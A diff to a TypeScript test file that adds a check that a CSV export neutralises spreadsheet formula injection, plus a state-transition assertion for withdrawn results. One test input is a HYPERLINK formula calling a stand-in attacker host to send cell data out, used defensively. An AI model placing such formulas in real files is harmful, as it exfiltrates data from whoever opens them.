@@ -18,10 +18,10 @@ import { evaluationItems, evaluations } from "../../db/schema.js";
 import { testApp, testDb, type TestDb } from "../../test/db.js";
 import { fakeShort } from "../../test/fakeType.js";
 import { reload, seedLive } from "../../test/live.js";
-import { applyState, joinedItems } from "../evaluation/service.js";
+import { applyState, isLegalTransition, joinedItems } from "../evaluation/service.js";
 import * as grading from "../grading/service.js";
 import * as live from "../live/service.js";
-import { BOM, resultsCsv } from "./csv.js";
+import { BOM, csvField, resultsCsv } from "./csv.js";
 import * as service from "./service.js";
 
 let raw: TestDb;
@@ -140,6 +140,26 @@ describe("the CSV export (F-RES-02)", () => {
     expect(lines.some((l) => l.endsWith(";;0;1.0"))).toBe(true);
     expect(csv.includes(",")).toBe(false);
   });
+
+  /**
+   * Finding M2: names and emails come from the roster import and from the
+   * identity provider's claims, and the file is opened in Excel by the
+   * teacher. Quoting does not stop a formula from running; the prefix does.
+   */
+  it("neutralises a field a spreadsheet would run as a formula", () => {
+    // The prefix first, then the RFC-4180 quoting of the quotes it contains.
+    expect(csvField('=HYPERLINK("http://evil.test?"&A1)')).toBe(
+      `"'=HYPERLINK(""http://evil.test?""&A1)"`,
+    );
+    expect(csvField("+1 41 79")).toBe("'+1 41 79");
+    expect(csvField("-2")).toBe("'-2");
+    expect(csvField("@user")).toBe("'@user");
+    expect(csvField("\tlead")).toBe("'\tlead");
+    // …and a field that needs quoting is still quoted, prefix included.
+    expect(csvField('=a;b"c')).toBe(`"'=a;b""c"`);
+    // An ordinary field is untouched: the export stays diff-readable.
+    expect(csvField("Dupond")).toBe("Dupond");
+  });
 });
 
 describe("release (F-RES-04, F-GRADE-09)", () => {
@@ -171,6 +191,9 @@ describe("release (F-RES-04, F-GRADE-09)", () => {
     expect(withdrawn.releasedAt).toBeNull();
     expect(withdrawn.releasedGrades).toBeNull();
     expect(withdrawn.state).toBe("closed");
+    // Finding L7: the withdrawal goes through the state table like every
+    // other move, instead of writing `closed` behind its back.
+    expect(isLegalTransition("released", "closed")).toBe(true);
   });
 
   it("refuses to release an evaluation that is still running", async () => {
